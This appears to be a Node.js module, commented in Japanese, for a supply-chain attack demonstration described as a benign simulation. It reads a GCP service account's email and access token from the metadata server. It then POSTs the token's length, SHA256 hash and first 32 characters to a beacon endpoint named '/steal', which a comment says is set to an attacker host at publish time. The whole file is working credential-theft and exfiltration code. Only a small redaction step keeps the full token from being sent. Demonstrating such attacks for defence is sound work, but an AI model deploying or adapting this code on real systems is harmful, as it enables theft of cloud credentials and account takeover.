'use strict';
// ⚠️ デモ専用の共通ロジック（良性シミュレーション）。
// GCP メタデータサーバから SA アクセストークンを取得するが、送るのは「取得できた証拠」だけで、
// 使えるトークンそのものは送らない（長さ・SHA256・共通接頭辞のみ）。
const http = require('http');
const crypto = require('crypto');

// 送信先。publish 時に ATTACKER で埋め込む（未指定ならローカルのモック）。
const BEACON = process.env.DEMO_BEACON || 'http://127.0.0.1:9099/steal';

function httpGet(host, path, headers, timeoutMs) {
  return new Promise((resolve) => {
    const req = http.request({ host, path, method: 'GET', headers, timeout: timeoutMs }, (res) => {
      let b = '';
      res.on('data', (c) => (b += c));
      res.on('end', () => resolve({ status: res.statusCode, body: b }));
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => {
      req.destroy();
      resolve(null);
    });
    req.end();
  });
}

// GCP メタデータサーバから SA トークンを取り、「使えない形の証拠」に変換する。
// GCP 外（ローカル等）では到達しないので null を返す。
async function stealTokenProof() {
  const H = { 'Metadata-Flavor': 'Google' };
  const meta = (p) => httpGet('169.254.169.254', p, H, 2000);
  const email = await meta('/computeMetadata/v1/instance/service-accounts/default/email');
  const tok = await meta('/computeMetadata/v1/instance/service-accounts/default/token');
  if (!tok || tok.status !== 200) return null;
  let token = '';
  try {
    token = JSON.parse(tok.body).access_token || '';
  } catch {
    token = '';
  }
  if (!token) return null;
  return {
    sa: email && email.status === 200 ? email.body.trim() : '(unknown)',
    tokenLen: token.length,
    tokenSha256: crypto.createHash('sha256').update(token).digest('hex'),
    tokenPrefix: token.slice(0, 32) + '…', // ya29.a0A... 先頭部分のみ（識別用の共通接頭辞中心）。全体ではないため単体では使えない
  };
}

// 送信（fire-and-forget だが Promise を返すので await 可能）。
function send(payload) {
  return new Promise((resolve) => {
    try {
      const u = new URL(BEACON);
      const req = http.request(
        {
          hostname: u.hostname,
          port: u.port || 80,
          path: u.pathname,
          method: 'POST',
          headers: { 'content-type': 'application/json' },
        },
        (res) => {
          res.on('data', () => {});
          res.on('end', resolve);
        }
      );
      req.on('error', () => resolve());
      req.setTimeout(3000, () => {
        req.destroy();
        resolve();
      });
      req.write(JSON.stringify(payload));
      req.end();
    } catch {
      resolve();
    }
  });
}

module.exports = { stealTokenProof, send, BEACON };
